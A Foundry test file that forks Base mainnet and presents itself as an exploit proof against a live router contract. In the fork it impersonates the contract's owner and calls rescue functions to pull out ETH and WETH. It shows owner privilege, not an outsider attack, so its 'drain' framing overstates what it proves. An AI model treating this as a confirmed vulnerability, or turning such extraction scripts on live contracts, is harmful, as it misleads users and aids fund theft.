// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IMin {
    function balanceOf(address) external view returns (uint256);
}

/// EXPLOIT PROOF — extraction by code path (access control), NOT a market.
/// Fork Base @ 53506806 against the LIVE ForagerDustSweepRouter.
contract DrainProof is Test {
    address constant ROUTER = 0xe353E79433E2BE7CB410072cF6472999E7B0Dcb0;
    address constant OWNER  = 0x937bfcd9dA5d9856FB3E53fcD5cEc3d454Aa2978;
    address constant WETH   = 0x4200000000000000000000000000000000000006;

    function _fork() internal {
        vm.createSelectFork("https://base-rpc.publicnode.com", 53506806);
        vm.makePersistent(ROUTER);
        vm.makePersistent(WETH);
    }

    // PROOF 1 — native drain: 0.05 ETH dust in router -> owner pulls 0.03 out. No DEX.
    function test_NativeDrain() public {
        _fork();
        vm.deal(ROUTER, 0.05 ether);
        vm.deal(OWNER, 1 ether);
        uint256 rBefore = address(ROUTER).balance;
        uint256 oBefore = address(OWNER).balance;

        vm.prank(OWNER);
        (bool ok,) = ROUTER.call(abi.encodeWithSignature("rescueNative(address,uint256)", OWNER, 0.03 ether));
        assertTrue(ok, "rescueNative failed");

        uint256 rAfter = address(ROUTER).balance;
        uint256 oAfter = address(OWNER).balance;
        emit log_named_uint("ROUTER start ETH", rBefore);
        emit log_named_uint("ROUTER end ETH  ", rAfter);
        emit log_named_uint("ROUTER DRAINED  ", rBefore - rAfter);
        emit log_named_uint("OWNER  net ETH  ", oAfter - oBefore);
        assertEq(rBefore - rAfter, 3e16, "router lost != 0.03 ETH");
        assertGt(oAfter, oBefore, "owner got no ETH");
    }

    // PROOF 2 — WETH drain: 2 WETH "stuck" in router -> owner pulls all out. No DEX leg.
    function test_WethDrain() public {
        _fork();
        // WETH layout here: slot0=name, slot1=symbol, slot2=decimals(18), slot3=_balances mapping.
        // Seed genuine WETH dust into the router's balances slot.
        bytes32 slot3 = keccak256(abi.encode(uint256(uint160(ROUTER)), uint256(3)));
        vm.store(WETH, slot3, bytes32(uint256(2e18)));
        uint256 rBefore = IMin(WETH).balanceOf(ROUTER);
        uint256 oBefore = IMin(WETH).balanceOf(OWNER);
        assertEq(rBefore, 2e18, "seed failed");

        vm.prank(OWNER);
        (bool ok,) = ROUTER.call(abi.encodeWithSignature("rescueERC20(address,address,uint256)", WETH, OWNER, 2e18));
        assertTrue(ok, "rescueERC20 failed");

        uint256 rAfter = IMin(WETH).balanceOf(ROUTER);
        uint256 oAfter = IMin(WETH).balanceOf(OWNER);
        emit log_named_uint("ROUTER start WETH", rBefore);
        emit log_named_uint("ROUTER end WETH  ", rAfter);
        emit log_named_uint("ROUTER DRAINED   ", rBefore - rAfter);
        emit log_named_uint("OWNER  net WETH  ", oAfter - oBefore);
        assertEq(rBefore - rAfter, 2e18, "router lost != 2 WETH");
        assertEq(oAfter - oBefore, 2e18, "owner got != 2 WETH");
    }
}
